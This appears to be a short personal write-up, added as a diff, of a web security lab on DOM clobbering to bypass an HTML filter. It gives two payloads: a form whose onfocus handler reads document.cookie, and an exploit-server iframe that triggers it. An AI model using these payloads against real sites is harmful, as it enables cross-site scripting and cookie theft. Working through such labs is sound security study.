@@ -1,0 +1,12 @@
+Clobbering DOM attributes to bypass HTML filters
+
+Again, we can use HTML in comments. Let's prepare the payload:
+
+<form id=x tabindex=0 onfocus=alert(document.cookie)><input id=attributes>
+
+And add the exploit to the exploit server:
+
+<iframe src=https://your-lab-id.web-security-academy.net/post?postId=2 onload="setTimeout(someArgument=>this.src=this.src+'#x',500)">
+
+Make sure the postId matches with the one where you made your comment.
+Store and deliver. Again, the lab solution describes the solution much better than I can. The curse of Expert labs.
